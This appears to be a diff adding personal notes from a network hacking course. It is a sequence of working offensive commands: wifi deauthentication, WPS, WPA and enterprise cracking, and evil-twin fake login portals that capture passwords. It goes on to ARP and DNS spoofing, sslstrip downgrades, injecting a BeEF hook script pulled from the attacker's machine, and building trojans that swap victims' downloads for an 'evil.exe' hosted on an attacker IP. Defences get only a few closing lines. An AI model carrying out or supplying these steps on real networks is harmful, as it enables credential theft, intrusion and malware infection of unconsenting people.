@@ -1,0 +1,635 @@
+// Network hacking (Intermediate to Advanced) --ZSecurity
+
+
+1. Pre-Connection Attacks
+
+1.1 Change MAC address manually
+>ifconfig wlan down
+>ifconfig wlan0 hw ether 00:11:22:33:44:55
+>ifconfig wlan0 up
+
+
+1.2 Targeting 5GHz networks
+Airodump-ng only sniffs on 2.4GHz (by default)
+>airodump-ng --band a mon0				// a means 5GHz
+Now it depends on the wifi card whether it can read 5Ghz network
+
+
+1.3 Deauthenticating a client from protected wifi network
+>aireplay-ng --deauth 0 -a [router_mac_addresss] -c [client_mac_address] mon0			(0 for infinite packets)
+
+
+1.4 Deauthenticating multiple clients from protected wifi network
+>aireplay-ng --deauth 10000 -a [router_mac_addresss] -c [client_mac_address] mon0 &> /dev/null & 		(process will run in the background and no display of authentication packets will be shown and will return job ID)
+>aireplay-ng --deauth 10000 -a [router_mac_addresss] -c [client_mac_address] mon0 &> /dev/null & 	(in the same terminal, now two process ae running in the background and deauthenticating multiple clients)
+
+#jobs 	//command to show the background running processes
+#kill %1 	//job id 1 will be killed
+#killall aireplay-ng  		//all aireplay-ng process will be killed
+
+
+1.5 Deauthenticating all clients from protected wifi network
+>aireplay-ng --deauth 0 -a [router_mac_addresss] mon0				//omit the -c parameter
+
+#airodump-ng --bssid [router_mac_addresss] --channel [whatever channel number running] mon0			(to view the clients connected to router)
+
+
+
+1.6 Deauthenticating same client from multiple bands or network
+>airodump-ng --band abg mon0				//view both 2.4GHz and 5Ghz networks
+Check the same network that is running on both 2.4GHz and 5GHz, it will have different mac address and channel number
+Situation is that if we disconnect device from one band, it gets automatically connected to another band
+>airodump-ng --bssid [same_router_mac_addresss1] --channel [eg1] mon0
+>airodump-ng --bssid [same_router_mac_addresss2] --channel [eg100] mon0
+
+>aireplay-ng --deauth 0 -a [router_mac_addresss1] -c [iphone_mac_address] mon0
+After we run this, iphone connects to 5Ghz network
+>aireplay-ng --deauth 0 -a [router_mac_addresss2] -c [iphone_mac_address_if_changed_in_this_router] -D mon0 		(-D when deauthenticating 5GHz network)
+
+
+
+
+
+
+
+
+
+2. Gaining Access (Part 1)
+
+2.1 Discovering Hidden Networks
+>airodump-ng --bssid [hidden_router_mac_addresss] --channel [eg6] mon0				//the hidden network will be shown like <length 0>
+>aireplay-ng --deauth 4 -a [router_mac_addresss1] -c [client_mac_address] mon0		//deauth from split second and when the device connects back, we get the name of the router
+
+
+2.2 Connecting to hidden network
+Unlike we connect normal wifi, we have to now give normal ssid and password
+
+
+2.3 Bypassing Mac Filtering Blacklists and Whitelists
+Blacklists can be easily bypassed by just chaging to the random mac address
+Bypassing whitelists-
+>airodump-ng mon0						//list all the available networks
+>airodump-ng --bssid [router_mac_addresss] --channel [channel_no] mon0		//see all the devices connected to it
+Now as the devices appear that are connected to the router, it means that these mac addresses are allowed in the whitelist
+Now change your mac address to the client's mac address
+>macchanger  -m [client_mac_address] wlan0						//wifi card is in managed mode
+
+
+2.4 Cracking SKA WEP network
+Shared Key Authentication
+>airodump-ng --bssid [router_mac_addresss] --channel [channel_no] --write test1 mon0	//saving the details in test1 file
+This method works on both normal WEP or SKA WEP, but condition is that there should be one client connected
+>aireplay-ng --arpreplay -b [router_mac_addresss] -h [client_mac_address] mon0  (It will start to capture the arp packets)
+>aircrack-ng test1.cap				//it will start to crack the cap file of arp packets
+
+
+
+
+
+
+
+
+
+
+3. Gaining Access Captive Portals (Part 2)
+
+3.1 Bypassing it by changing our mac address to the client that is already connected (one method)
+
+3.2 Sniffing Captive Portal login information in monitor mode (second method)
+3.2.1 Starting monitor mode
+>ifconfig wlan0 down
+>iwconfig wlan0 mode monitor
+>ifconfig wlan0 up
+
+3.2.2 Seeing the different networks and their client connected
+>airodump-ng wlan0
+>airodump-ng --bssid [router_mac_addresss] --channel[channel_no] --write airport wlan0
+Now deauthenticate the client and let him connect back.
+
+3.2.3 Analysing using wireshark
+Open wireshark
+Open the airport.cap file generated
+Now we are interested in HTTP traffic as username and password are sent on HTTP traffic
+Search for HTTP traffic and POST request as the form must have been submitted via post
+There you will find username and password 
+
+
+
+3.3 Sniffing credentials using ARP spoofing
+>mitmf --arp --spoof -i wlan0 --gateway 192.168.0.1			//MITM attack, performing arp spoofing
+(To find gateway, we use route -n and it will show the gateway)
+
+Alternative to Mitmf tool is Ettercap
+>ettercap -Tq -M arp:remote -i wlan0 ///				(Listen to Text quietly and method used is arp spoofing remotely and interface is wlan0
+
+
+
+3.4 Sniffing using Social Engineering
+3.4.1 Creating a fake login page by cloning the login page
+To create the fake login page, mozilla provides a built in tool, click on save as and save the page. All the files including css, js, images will be downloaded
+To deploy on localhost, move the file saved to the /var/www/html/ and rename the html file to index.html
+To start the web server, service apache2 start (command to be typed)
+To access the page, type 127.0.0.1
+
+3.4.2 Fixing Relative Link in fake login page
+Put / in front of the realtive url accessing css, images etc.
+eg - <link href="/Welcome_Online/base.css">
+We are putting it because whenever we will deploy it on internet, website will go to root directory and will be able to find welcome online folder and then access the file.
+
+
+3.4.3 Fixing Form Tag in fake login page
+Check in the web page that form that is shown in fake login page is enveloped in form tag in inspect element.
+If it is not, then envelop it in the form tag.
+<form method="post" action="/index.html">All the username, password field, login button in this form tag </form>
+
+
+3.4.4 Fixing Submit button
+If the fake login page shows that the login button is just a container and its functionality is being implemented by js, then replace it with proper submit button of html
+<input type=submit value="log in"> and provide it the proper styling
+
+
+3.4.5 Creating Fake AP
+Router broadcasting signal - use wifi card with hostapd
+DHCP server to give IPs to clients - dnsmasq
+DNS server to handle dns requests - dnsmasq
+
+>Install hostapd, dnsmasq -- apt-get install hostapd dnsmasq
+>Next stop the network manager -- service network-manager stop
+>Flush the iptables, if any rules are specified, it will flush them -- run the commands specified in flushiptables.sh file
+
+
+3.4.6 Starting the Fake Captive Portal
+>Initiating the dnsmasq
+dnsmasq -C /root/Downloads/Fake-AP/dnsmasq.conf						//choosing where the configuration file is kept
+This will start the dhcp and dns server in the background
+
+>Initiating the hostapd
+hostapd /root/Downloads/Fake-AP/hostapd.conf -B				//-B runs the program in the background
+Edit the hostapd.conf to provide the appropriate ssid name
+Run the command and it will start to broadcast the ssid
+
+>Setting the Ip address gateway as mentioned in dnsmasq.conf
+ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+
+>Start the web server
+service apache2 start
+
+#In the real scenario, deauthenticate the original wifi so that people are not able to connect to it, and they will come to our fake ap
+
+#Still Issues
+>Captive portal should automatically be opened up as soon as we connect to network
+>If someone tries to open hsts secured website like facebook, it will show an error
+
+
+3.4.7 Redirecting requests to captive portal login page (automatically open up) (1 issue solved)
+>We will edit the configuration file of service apache2 
+leafpad /etc/apache2/sites-enabled/000-default.conf
+
+Add a tag after closing of </virtualhost>
+<Directory "/var/www/html">
+Inside it, copy paste the rewrite rules available in fake ap requirements folder
+</Directory>
+
+Also at the starting, <VirtualHost *.80>, add the line,
+Error Document 404 /
+
+and done, page will automatically be opened in every device
+
+
+3.4.8 Generating Fake SSL certificate (2nd issue solved)
+Apache service is not able to handle https request, so we will solve that thing and issue will automatically be resolved
+>Creating fake ssl certificate
+openssl req -new -x509 -days 365 -out /root/Downloads/Fake-AP/cert.pem -keyout /root/Downloads/Fake-AP/cert.key
+It will ask for passphrase to be set, set it  and done. Certificate will be created
+
+
+3.4.9 Enabling SSL HTTPS on webserver
+>a2enmod ssl			//this will enable ssl
+Now we will configure apache to use certificate and key
+>leafpad /etc/apache2/sites-enabled/000-default.conf
+We will create another virtualhost tag enabling ssl			(do it after closing of 1st virtualhost tag)
+<VirtualHost *.443>
+	SSLEngine On
+	SSLCertificateFile /root/Downloads/Fake-AP/cert.pm
+	SSLCertificateKeyFile /root/Downloads/Fake-AP/cert.key
+</VirtualHost>
+
+Now we will modify the apache ports file
+>leafpad /etc/apache2/ports.conf
+Make sure we are listening to port 443
+Listen 443					//add this line
+
+Now we will restart the apache2 service
+>service apache2 restart
+It will ask you for password while we generated the certificate and done
+
+
+3.4.10 Sniffing and Analysing Login Credentials
+>tshark -i wlan0 -w royal-wifi.cap				//it just starts to capture and stores it in cap file
+Then next open wireshark for analysing cap files
+We will search for HTTP traffic and post request
+
+
+
+
+
+
+
+
+
+
+
+
+
+4. Gaining Access WPA and WPA2 Cracking Exploiting WPS (Part 3)
+>wash -i wlan0 					//shows all the wps enabled routers
+>reaver --bssid [router_mac_addresss] --channel [channel_no] -i mon0		//using reaver to crack wps network
+
+4.1 Bypassing Failed to associate Issue
+We will manually associate using aireplay-ng, and tell reaver to not associate
+Associating means that we will fakeauth packets to the router
+>aireplay-ng --fakeauth 100 -a [router_mac_addresss] -h [our kali mac address] mon0		//manually associate with the target
+We will leave it running and in new terminal, we will run reaver
+
+Now again we will run reaver
+>reaver --bssid [router_mac_addresss] --channel [channel_no] -i mon0 -A				//-A is for telling reaver to not associate
+
+
+4.2 Bypassing 0x3 and 0x4 errors
+After we solved above issue, we got reaver running but it was just 0% getting completed
+To solve this, we will first try to know what is happening at background
+>reaver --bssid [router_mac_addresss] --channel [channel_no] -i mon0 -A -vvv		//vvv for verbose output
+Do not forget to associate using aireplay-ng
+
+Solution:
+>reaver --bssid [router_mac_addresss] --channel [channel_no] -i mon0 -A -vvv --no-nacks		//reaver will not send nack packets and thus will not try the same pin again and again
+
+
+4.3 Unlocking WPS
+Some router gets locked when we try to bruteforce wps pin, the process will not move further. Wash tool shows that the wps pin is locked
+One way is to to deauthenticate everyone from the router and the person will think that there is an error, so he will physically restart the router leading to unlocking 
+
+4.3.1 Other way is to unlock wps using mdk3
+This tool will create fake MAC addresses and get all these mac addresses to pretent as if they all are clients and all are trying to connect to that network. When there are large no. of clients want to connect to one router, so some router will not able to handle demand and will automatically reset. This way they will unlock wps.
+>mdk3 mon0 a -a [router_mac_addresss] -m 		//a for DOS attack, -a specifying the AP mac address, -m for providing valid mac address not the fake ones like 00:00:00:11:11:11
+Let it run for 10000 packets 
+Then see again if the client wps is unlocked
+
+As soon as it gets unlocked, again run reaver and don't worry, reaver save the status. You do not have to run from the starting
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+5. Gaining Access WPA & WPA2 Cracking Advanced Wordlist Attack (Part 4)
+
+5.1 Crack using aircrack-ng
+>aircrack-ng handshake-01.cap -w wpa-wordlist			//it will start cracking
+Problem with aircrack-ng is that whenever we start again, it will start from scratch, it does not pause and resume option
+
+5.2 Crack using John the Ripper
+>john --wordlist=wpa-wordlist --stdout --session=upc | aircrack-ng -w - -b [router_mac_addresss] handshake-01.cap
+This will show the wordlist and that wordlist we are passing to aircrack-ng where -w - is taking the wordlist from the john command. This is called piping the output and take that output to input of someone.
+We used john the ripper for creating session named 'upc'.
+Run it and whenever quitting, press 'q' to save the session
+
+To resume the session,
+>john --restore=upc | aircrack-ng -w - -b [router_mac_addresss] handshake-01.cap
+
+
+5.3 Piping large wordlist made from crunch to aircrack-ng without saving the wordlist
+>crunch 8 8 | aircrack-ng -b [router_mac_addresss] -w - handshake-01.cap
+8 8 means minimum 8 characters and maximum of 8 characters
+Using piping, we are not storing wordlist on the disk and directly providing output of crunch to aircrack-ng
+
+
+5.4 Using crunch, john, aircrack-ng together (wordlist, save session, crack the file)
+>crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b [router_mac_addresss] -w - handshake-01.cap
+
+To restore the session
+crunch 8 8 | john --restore=session1 | aircrack-ng -b [router_mac_addresss] -w - handshake-01.cap
+
+
+5.5 Cracking WPA/WPA2 password using GPU
+aircrack-ng doesn't allow to crack using gpu, so we will use another tool named 'hashcat' 
+We can use hashcat in both windows and linux. It is much easier to do on windows as most of the graphics card company have drivers for windows
+We need to download driver for hashcat as per our graphics card in windows ...Intel GPU or AMD GPU
+It is mentioned in the hashcat website. (https://hashcat.net/hashcat/)
+Also cap file extension doesn't work with hashcat, we need to convert it into hccapx. This we can do from hashcat website. (https://hashcat.net/cap2hashcat/)
+Put the wordlist and the hccapx file into the same folder where driver is downloaded for hashcat for GPU
+ 
+5.5.1 Running it on windows
+Open the directory where the folder is into command prompt
+>hashcat64.exe --help			//menus available in hashcat
+>hashcat64.exe -I 				//shows the devices that are available for cracking (CPU or GPU)
+>hashcat64.exe -m 2500 -d 1 handshake.hccapx rockyou.txt			(-m states that which mode to crack, here 2500 is the no. of wpa/wpa2. It has many modes like md5,md5 salt and every mode has its number...and -d states which device to use to crack password)
+
+
+
+
+
+
+
+
+
+
+
+
+
+6. Gaining Access WPA & WPA2 Cracking Evil Twin Attack (Part 5)
+We can do it manually or using Fluxion Tool
+To create manually, do the same process as the "captive portal hacking". It is exactly the same. 
+
+To do it using Fluxion Tool-
+>cd /opt						//always install extra tools in opt directory(good habit)
+>git clone https://github.com/FluxionNetwork/fluxion			(Fluxion v2 is more reliable)
+>cd fluxion/install
+>bash install.sh					//will start installing fluxion
+>cd ..
+>bash fluxion.sh					//start the fluxion
+
+Easy to use
+
+6.1. Debugging and Fixing Login Interface issues
+There is a problem with login page as soon as someone connects with the wifi. (Remember we solved it in captive portal). Rest everything is fine
+Here Fluxion does not use apache2 server. It saves all its files in /tmp/TMPflux.
+Open the index.html file and add the / to the static files like href="bootstrap.min.css" to href="/bootstrap.min.css">
+Forward slash will be added to href and src tags containing bootstrap and script files
+Forward slash will also be added to form tag, that has "random.php" file, so change it to "/random.php".
+
+
+
+
+
+
+
+
+
+
+
+
+
+7. Gaining Access WPA & WPA2 Cracking WPAWPA2 Enterprise (Part 6)
+
+7.1 Creating Fake Access Point for WPA Enterprise
+>apt-get install hostapd-wpe				//specific for enterprise
+>leafpad /etc/hostapd-wpe/hostapd-wpe.conf			//making changes in the configuration file
+Once the file opens in leafpad, make the required changes:
+Change the ssid name...same to same as the wpa enterprise network
+
+>service network-manager stop
+>hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf			//starting the hostapd-wpe
+This will start the fake ap
+
+When someone will input the values, we will capture username and the hash of the password which we need to crack
+There is challenge-response authentication managed by wpa enterprise
+
+7.2 Cracking Login Credentials
+>asleap --help
+>asleap -C [challenge_received_from_above_response] - R [response_received_from_above_response] -W [wordlist]
+This will get us the password
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+8. Post Connection Attacks (Part 1)
+Works against Wifi and Ethernet networks
+We will learn both ways manually and the script one
+
+8.1. Ettercap tool
+Before starting it, we need to make some changes in the configuration file of ettercap
+>Remove the # (comment) from the iptables section (line says, if you use iptables:)
+>In the starting, set ec_uid = 0, and ec_gid=0
+Now it's ready to work
+
+>ettercap --help
+>ettercap -Tq ///				//run in text quiet mode and /// indicates that run for all targets
+>h 								//for inline help
+Now many options come, play with them
+
+8.1.1 MITM
+>ettercap -Tq -M arp:remote -i wlan0 /[router gateway]// /[target ip]//
+Giving the mode to run arp spoofing, providing the interface and etc.
+and run it and arp spoofing done
+
+8.1.2 Ettercap plugins
+8.1.2.1. Autoadd plugin
+>ettercap -Tq -M arp:remote -i wlan0 ///          (Poisoning all the connected devices)
+>l 							(to show the host connected)
+>p 							(to add the plugins)
+>autoadd					(type the plugin name)		(it will automatically add the targets in the group)	
+
+8.1.2.2 DNS Spoof plugin
+#DNS spoofing - It is used to redirect the website target searching for to our fake website 
+To use it, first we need to make changes in dns_spoof configuration file
+>leafpad /etc/ettercap/etter.dns
+Add the A record after line 'redirect to www.linux.org'
+bing.com 	A		192.168.2.5							(Clicking on bing.com and redirecting to kali linux ip)
+*.bing.com	A		192.168.2.5							(subdomains of bing.com will also be redirected)
+
+>service apache2 start
+>ettercap -Tq -M arp:remote -i wlan0 -S -P dns_spoof /[router ip gateway]// /[target ip]//
+(-S to tell ettercap to not self sign ssl certificates, -P if you already know the plugin name otherwise use the above method to add plugin)
+Now if the user goes to bing.com, it will automatically be redirected to our server
+
+
+8.1.3 Bypassing RouterSide security and poisoning target without triggering alarm
+To bypass it, we do One Way Spoofing--Just tell the victim that we are the router 
+>ettercap -Tq -M arp:oneway -i wlan0 -S /[target ip]// /[router ip gateway]//
+Sometimes ettercap sniffer misses some packets in one way spoodfing, so we will run wireshark to sniff it
+Same like before we will see http traffic and post request
+>wireshark &					//run wireshark process in the background and not fill the terminal
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+9. Post Connection Attacks Analysing Data Flows & Running Custom Attacks (Part 2)
+MITMProxy tool - https://github.com/mitmproxy/mitmproxy/releases
+
+9.1 Analysing data & using MITMProxy in explicit mode
+>cd /opt/mitmproxy
+>./mitmweb						//web interface to show the packets coming to and fro from proxy and analyse it
+It says that proxy and web server is running
+Web server is the web interface where mitmweb is running
+and we need to provide proxy to mozilla firefox i.e. 127.0.0.1, port 8080 (where the proxy server is running)
+
+9.1.1 Analysing, filtering and highlighting data shown in mitmweb
+screenshots attached in pdf file
+
+9.1.2 Intercept network flows
+When we intercept eg- POST request, everything will flow but post request will be paused (~m POST)
+We need to resume it, if we want to send it
+To intecept everything (/*)
+
+9.1.3 Modifying Responses and Injecting JS manually
+Intecepting response that has <body> tag, (~bs </body>)
+These all paramters are shown us..no need to remember
+Edit the response and put the JS code
+Save it and resume the flow of packets
+
+9.1.4 Intercepting and Modifying Responses in Transparent mode
+Real Time scenario-
+>ettercap -Tq -M arp:remote -i wlan0 -S /[target_ip]// /[router ip gateway//		(becoming the MITM)
+After becoming MITM, we need to redirect the traffic from port 80 to port 8080 where mitm proxy will be running. To do this, we need to configure iptables
+>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+Now we will run MITM proxy
+>./mitmweb --transparent			//run proxy in transparent mode..by default it runs on explicit mode
+In explicit mode, we need to configure proxy in the browser but in transparent we do not need to do it.
+The data will start flowing through out Kali machine
+#First perform the attacks on your local machine using explicit mode, and once you become MITM, you just need to execute them. It is a good practice.
+After you are done, flush the iptables rules
+>iptables -t nat --flush
+
+9.1.5 Editing Responses and Injecting BeEf's code on the fly
+BEEF - Browser Exploitation framework
+Click on the application in the kali and it will start to run
+BEEF will give you a code so that people can be hooked to it
+<script src="http://127.0.0.1:3000/hook.js"></script>
+Put your kali machine ip instead of 127.0.0.1 and that's it, code is ready
+and now same process, intecept body response and inject this script there.
+and now the computer is hooked to beef
+
+9.1.6 Editing responses automatically based on Regex
+The problem above is that we need to manually change the response and then again click on resume. This will slow down the connection of the victim and also we need to constantly monitor the packets.
+Solution:-
+>./mitmdump --transparent --replace :~bs::"</body>":"<script src="http://kali_machine_ip:3000/hook.js"></script></body>"
+Running MITM dump in transparent mode and using the response body regex, we are replacing body tag with the attack line of code (replace paramter takes :::	, first for the regex, then what you are searching for, what you want to replace with)
+~bs (response body) doesn't work in mitmdump, so we will change it to ~s (that is any response)
+We will not run mitmweb right now
+And automatically the web browser is hooked
+
+9.1.7 Bonus video of using features on beef
+Working of BEEF
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+10. Post Connection Attacks Writing Custom Scripts To Execute Own Attacks (Part 3)
+MITM Scripts helps to run own custom attacks
+http://docs.mitmproxy.org/en/stable/scripting/overview.html
+To run MITM scripts:-
+>./mitmdump -s /root/basic.py				//-s tells which script to run
+
+
+10.1 Generating Trojans using Trojan Factory
+https://github.com/z00z/TrojanFactory
+>clone the respository
+>Download autoit.exe file
+>To run exe file, we need to use wine
+>wine autoit.exe and install it
+
+10.2 Creating Trojans
+>python trojan_factory.py -f [direct url to file] -e [direct url to evil file] -o [location to store the result] -i [location of icon file]
+(direct url that is directly accessible over the internet using link, -o will merge these two files and where do you want to store)
+python trojan_factory.py -f https://pubs.readme.pdf -e http://10.20.15.8/evil.exe -o /var/www/html/readme.exe -i /root/Downloads/pdf.ico
+We will run and readme.exe will be created
+#For this you need an evil trojan file already (it can be anything like keylogger, credential harvester etc.)
+
+10.3 Executing Bash command in python script
+Script saved in scripts folder
+Target opening any of the pdf file, will see only our evil.exe file
+
+
+10.4 Use the mitmproxy_script.py in the trojan factory repository. It is covering issues that there in the above process
+Edit the python file and make changes
+>Set the IP of your machine
+>Set the target to extensions
+>Set the evil file path to run in the background (# should be included at the end of the file)
+
+#Do all the process step by step and thus attack will be successful
+Run the mitmdump
+Run the ettercap
+Run the iptables
+
+
+
+
+
+
+
+
+
+
+
+
+
+11. PostConnection Attacks Doing All Of The Above On HTTPS Websites (Part 4)
+https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
+
+>Run the arp spoofing attack
+>Run MITMdump  ./mitmdump -s sslstrip.py --transparent  (All HTTPS connection will be downgraded to http)
+>Run Iptables
+
+
+11.1 Replacing HTTPS Downloads
+We can pass different scripts in mitm proxy
+>./mitmdump -s sslstrip.py -S /root/basic.py --transparent		(Running two scripts, first will https to http and then our custom made script which will look for exe file and change with our evil file)
+
+11.2 Injecting data in JS HTML elements etc. in HTTPS websites
+HTTPS websites will have the data encrypted but sslstrip will downgrade it for us
+>./mitmdump -s sslstrip.py --transparent --replace :~bs::"</body>":"<script src="http://kali_machine_ip:3000/hook.js"></script></body>"
+Just the sslstrip is added, else everything is same
+
+#It will not work on HSTS websites, browser are pre-programmed to not open HSTS websites on HTTP 
+
+
+11.3 Security against these attacks
+>xARP monitors the ARP table and if there is a change, it generates alarm
+>HTTPSEverywhere - addon that is installed in browser and it will always open https, our script will not able to decrypt the packets
+
+#ends
+
+
+
+
+
+
+
+
+
+
+
